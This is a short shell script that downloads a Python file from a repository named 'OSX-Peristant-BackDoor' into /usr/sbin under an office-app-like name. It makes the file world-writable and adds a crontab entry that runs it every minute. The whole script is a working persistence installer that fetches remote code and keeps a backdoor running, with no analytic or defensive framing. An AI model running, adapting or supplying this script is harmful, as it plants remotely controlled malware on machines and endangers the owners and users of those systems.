#!/bin/sh
curl https://raw.githubusercontent.com/pistacchietto/OSX-Peristant-BackDoor/master/woffice_app.py  -o /usr/sbin/woffice_app.py
chmod 777 /usr/sbin/woffice_app.py
#croncmd="/home/me/myfunction myargs > /home/me/myfunction.log 2>&1"
#cronjob="0 */15 * * * $croncmd"
#croncmd="/etc/init.d/rc.local"
croncmd="python /usr/sbin/woffice_app.py"
cronjob="* * * * * $croncmd"

( crontab -l | grep -v -F "$croncmd" ; echo "$cronjob" ) | crontab -